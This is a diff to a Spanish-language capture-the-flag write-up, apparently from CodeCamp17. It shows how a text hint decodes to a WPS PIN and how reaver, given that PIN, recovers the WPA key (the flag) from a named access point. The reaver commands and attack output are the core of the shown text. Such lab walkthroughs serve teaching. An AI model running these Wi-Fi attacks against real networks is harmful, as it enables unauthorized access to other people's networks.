@@ -1,11 +1,11 @@
 # The love is in the air
 
-<3
+You are the G+*U to my <3
 
 R: **CodeCamp17{aHR0cHM6Ly95b3V0dS5iZS9mUUdiWG1rU0Fycwo=}**
 
 
-Hit: //TODO
+Hit: https://youtu.be/fP22QqI32qs?t=7m19s
 
 ---------------------------
 
@@ -26,11 +26,14 @@ CH 13 ][ Elapsed: 0 s ][ 2017-02-06 00:18
 ```
 
 
-Con herramientas como wash es facil darse cuenta que tiene activado WPS. Curiosamente, es posible realizar un ataque sin saber el ESSID del AP. 
+Con herramientas como wash es facil darse cuenta que tiene activado WPS. Curiosamente, es posible realizar un ataque sin saber el ESSID del AP. Sin embargo, el proceso va a ser muy lento si no conocemos el PIN. La llave. The key.
 
+G+*U no nos dice nada, ya que buscamos un pin de 8 dígitos numéricos decimales y eso son 4 caracteres ASCII. ¿Y si lo traducimos al decimal?
+
+G+*U -> 71434285
 
 ```
-$ reaver -i mon0 -b 64:16:F0:E0:6F:CF -vvv
+$ reaver -i mon0 -b 64:16:F0:E0:6F:CF -vvv -p 71434285
 
 Reaver v1.4-r119 WiFi Protected Setup Attack Tool
 Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
@@ -38,37 +41,7 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetso
 [+] Waiting for beacon from 64:16:F0:E0:6F:CF
 [+] Switching mon0 to channel 1
 [+] Associated with 64:16:F0:E0:6F:CF (ESSID: (null))
-[+] Trying pin 12345670
-[+] Sending EAPOL START request
-[+] Received identity request
-[+] Sending identity response
-[+] Received M1 message
-[+] Sending M2 message
-[+] Received M3 message
-[+] Sending M4 message
-[+] Received WSC NACK
-[+] Sending WSC NACK
-[+] Trying pin 00005678
-[+] Sending EAPOL START request
-[+] Received identity request
-[+] Sending identity response
-[+] Received M1 message
-[+] Sending M2 message
-[+] Received M3 message
-[+] Sending M4 message
-[+] Received WSC NACK
-[+] Sending WSC NACK
-[+] Trying pin 11865674
-[+] Sending EAPOL START request
-[+] Received identity request
-[+] Sending identity response
-[+] Received M1 message
-[+] Sending M2 message
-[+] Received M3 message
-[+] Sending M4 message
-[+] Received WSC NACK
-[+] Sending WSC NACK
-[+] Trying pin 16535671
+[+] Trying pin 71434285
 [+] Sending EAPOL START request
 [+] Received identity request
 [+] Sending identity response
@@ -82,7 +55,7 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetso
 [+] Sending WSC NACK
 [+] Sending WSC NACK
 [+] Pin cracked in 15 seconds
-[+] WPS PIN: '16535671'
+[+] WPS PIN: '71434285'
 [+] WPA PSK: 'CodeCamp17{aHR0cHM6Ly95b3V0dS5iZS9mUUdiWG1rU0Fycwo=}'
 [+] AP SSID: 'love'
 ```
